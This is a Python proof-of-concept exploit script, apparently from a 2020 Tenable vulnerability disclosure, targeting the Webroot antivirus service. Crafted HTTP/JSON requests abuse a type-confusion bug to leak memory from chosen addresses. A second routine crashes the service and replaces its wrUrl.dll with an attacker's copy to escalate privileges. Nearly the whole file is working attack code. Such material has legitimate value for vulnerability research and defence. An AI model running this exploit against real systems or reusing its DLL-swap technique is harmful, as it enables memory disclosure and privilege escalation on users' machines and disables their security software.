'''
David Wells
03-13-2020
Tenable
WebRootPoC LPE/MemoryLeak
'''

import socket
import json
import sys, getopt
import struct
import shutil
import os
import time

HOST = '10.0.2.5'  # Webroot Service IP
PORT = 27019  #  Webroot Service Port

class UnencodableByte(Exception):
    pass

'''
Represents address and data found at address
'''
class MemoryData:
    def __init__(self, address, data):
        self.address = address
        self.data = data

def Usage():
    print("Usage: WebRootPoc.py [OPTION]\r\n  -r\t<32-bit Memory Address in Hex>\tReads Memory from Remote Webroot Instance\r\n  -e\tLocal Privilege Escalation")

def intToByteStr(hexval):
    return '{:02x}'.format(hexval)

'''
@:param - Address bytes
@:returns MemoryData representing address and data found in address

Crafts HTTP request that satisfies WebRoot service parsing.
Abuses a Type-Confusion vulnerability when "DATA" list is traversed. Webroot routine 
will expect list elements to be type JSON_OBJ and key into them accordingly. 
By embedding a [\"URL\"] list element, Webroot JSON parser will dereference 
this as if it were JSON obj looking for "URL" key/value pair and trigger a read-what-where. This
can be leaked back in the URL field of the server's response.

JSON_KEY on List obj (Bug), looks up "URL" key and return value pair
    |
    |
    V
___________                                 ___________
| LIST_OBJ |  --- Finds "URL" key match --> |  String |
|          |				                |  "URL"  |
------------                                -----------
    |
    | JSON_Key_Value returns value offset of buffer after matching URL
    V                                                  
______________________                              _____________________
| Type Confusion      |  -------------------------> |  \x41\x41\x41\x41  | - Supposed to be address of key "value", but we control this pointer via crafted string
| returns string      |                             | -----------------  |
| of next List element|                             |  11111111111111    | - Object type field is padded with "1"s to spoof expected type to pass Webroot check
-----------------------                             ----------------------
​
'''

def LeakMemory(addr_bytes):

    # Raise Exception if we cant encode address
    addr_bytes = [addr if int(addr, 16) <= 0x7f else None for addr in addr_bytes]
    if(None in addr_bytes):
        raise UnencodableByte

    http_response = ''
    http_lines = []
    http_lines.append("POST / HTTP/1.1")
    http_lines.append("\r\n")
    http_lines.append("Content-Type: application/urltree; charset=utf-8")
    http_lines.append("\r\n")
    http_lines.append("Content-Length:0")
    http_lines.append("\r\n\r\n")
    http_lines.append('{{"VER":1, "OP":1, "DATA":[["URL"], ["\\u00{}\\u00{}\\u00{}\\u00{}11111111111111111111"]], '
                      '"IDATA":[{{"TOKEN":"1","BCRI":"1"}}], "BRWSR":"Chrome"}}'.format(addr_bytes[0], addr_bytes[1], addr_bytes[2], addr_bytes[3]))
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.sendall("".join(http_lines).encode())
        http_response = s.recv(1024)

    if http_response == b'':
        return None

    payload = http_response.decode('latin1').split('\r\n\r\n')[1] # Get payload from HTTP response
    try:
        json_response = json.loads(payload)
    except:
        url_field = payload.split('URL')[1]
    try:
        url_field = json_response['DATA'][0]['URL']
    except:
        return None
    if url_field == '':
        return None
    return MemoryData(struct.unpack('>I', struct.pack('<I', int("".join(addr_bytes),16)))[0],
                      url_field)

'''
@param address - Address integer to read memory from. Address must not contain bytes greater than 0x7f.
@returns - List of MemoryData objs

This accepts a 32-bit address thats contents will be leaked from WebRoot server.
This function will raise an Exception of "Unencodable Byte" if individual address byte 
exceeds 0x7f, as bytes in that range are unencodable.

'''

def ReadMemory(address):
    print("\033[94mReading Memory starting @{:08x}...".format(address))
    addr_bytes = [intToByteStr(address & 0x000000ff), intToByteStr(address >> 8 & 0x0000ff), intToByteStr(address >> 16 & 0x00ff),
                  intToByteStr(address >> 24)]

    MemoryDatas = []

    for i in range(0, 0x7f):
        try:
            memDat = LeakMemory(addr_bytes)
        except UnencodableByte:
            print("Unencodable Byte found in supplied address. All bytes must be below 0x80")
            sys.exit(-1)
        if memDat is None:
            addr_bytes[0] = intToByteStr(int(addr_bytes[0], 16) + 1)  # incriment address 
            continue
        addr_bytes[0] = intToByteStr(int(addr_bytes[0], 16) + len(memDat.data))  # incriment address
        print("\033[92m@{:08x} - {}\x1b[0m".format(memDat.address, memDat.data))
        
        if int(addr_bytes[0], 16) > 0x7f:
            return
        MemoryDatas.append(memDat)


    return MemoryDatas

'''
Local Privilege Escalation.
By Crashing the AV service via Access Violation in our Type Confusion bug, we can replace the wrUrl.dll
in %PROGRAMDATA%\WrData\PKG with our own. This is done by renaming the "wrUrl" directory.
'''
def LPE():
    try:
        wrUrl_dll = open('wrUrl.dll', 'rb')
    except:
        print("Cannot find mock wrUrl.dll. Ensure it resides in current directory")
        sys.exit(-1)
    PKGPath = os.path.expandvars("%PROGRAMDATA%\WRData\PKG")
    PKGPath2 = os.path.expandvars("%PROGRAMDATA%\WRData\PKG2")
    try:
        ReadMemory(0) # Trigger Access Violation
    except ConnectionResetError:
        pass
    time.sleep(3)
    os.rename(PKGPath, PKGPath2)
    shutil.copytree(PKGPath2, PKGPath)
    shutil.copyfile('wrUrl.dll', os.path.join(PKGPath, 'wrUrl.dll')) # replace dll with our own

def main(argv):
    if len(argv) == 0:
        Usage()
    try:
        opts, args = getopt.getopt(argv, "r:e")
    except getopt.GetoptError:
        Usage()
        sys.exit(-1)

    for opt, arg in opts:
        if opt == '-r':
            try:
                ReadMemory(int(arg, 16))
            except ConnectionResetError:
                print("Ooops. Didnt get response back from Webroot, probably crashed it due to Access Violation. Make sure"
                    "Address is valid in remote WebRoot process or just try again after service auto-restarts")
                sys.exit(-1)
        elif opt == '-e':
            LPE()


if __name__ == "__main__":
    main(sys.argv[1:])
